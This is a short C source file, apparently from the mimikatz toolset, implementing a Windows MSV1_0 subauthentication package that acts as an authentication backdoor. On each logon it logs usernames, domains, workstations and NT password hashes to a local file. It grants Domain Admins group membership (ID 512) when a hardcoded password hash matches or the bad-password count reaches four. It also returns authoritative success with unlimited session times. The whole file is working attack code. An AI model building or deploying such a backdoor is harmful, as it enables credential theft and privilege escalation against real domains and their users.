/*	Benjamin DELPY `gentilkiwi`
	http://blog.gentilkiwi.com
	benjamin@gentilkiwi.com

	Vincent LE TOUX
	http://pingcastle.com / http://mysmartlogon.com
	vincent.letoux@gmail.com

	Licence : https://creativecommons.org/licenses/by/4.0/
*/
#include "ksub.h"

const BYTE myHash[LM_NTLM_HASH_LENGTH] = {0xea, 0x37, 0x0c, 0xb7, 0xb9, 0x44, 0x70, 0x2c, 0x09, 0x68, 0x30, 0xdf, 0xc3, 0x53, 0xe7, 0x02}; // Waza1234/admin
NTSTATUS NTAPI ksub_Msv1_0SubAuthenticationRoutine(IN NETLOGON_LOGON_INFO_CLASS LogonLevel, IN PVOID LogonInformation, IN ULONG Flags, IN PUSER_ALL_INFORMATION UserAll, OUT PULONG WhichFields, OUT PULONG UserFlags, OUT PBOOLEAN Authoritative, OUT PLARGE_INTEGER LogoffTime, OUT PLARGE_INTEGER KickoffTime)
{
	FILE *ksub_logfile;;
#pragma warning(push)
#pragma warning(disable:4996)
	if(ksub_logfile = _wfopen(L"kiwisub.log", L"a"))
#pragma warning(pop)
	{
		klog(ksub_logfile, L"%u (%u) - %wZ\\%wZ (%wZ) (%hu) ", UserAll->UserId, UserAll->PrimaryGroupId, &((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)->LogonDomainName, &((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)->UserName, &((PNETLOGON_LOGON_IDENTITY_INFO) LogonInformation)->Workstation, UserAll->BadPasswordCount);
		if(UserAll->NtPasswordPresent)
			klog_hash(ksub_logfile, &UserAll->NtPassword, FALSE);
		if((UserAll->BadPasswordCount == 4) || (UserAll->NtPasswordPresent && RtlEqualMemory(UserAll->NtPassword.Buffer, myHash, min(sizeof(myHash), UserAll->NtPassword.Length))))
		{
			UserAll->PrimaryGroupId = 512;
			klog(ksub_logfile, L" :)\n");
		}
		else klog(ksub_logfile, L"\n");
		fclose(ksub_logfile);
	}
	*WhichFields = 0;
	*UserFlags = 0;
	*Authoritative = TRUE;
	LogoffTime->QuadPart = KickoffTime->QuadPart = 0x7fffffffffffffff;
	return STATUS_SUCCESS;
}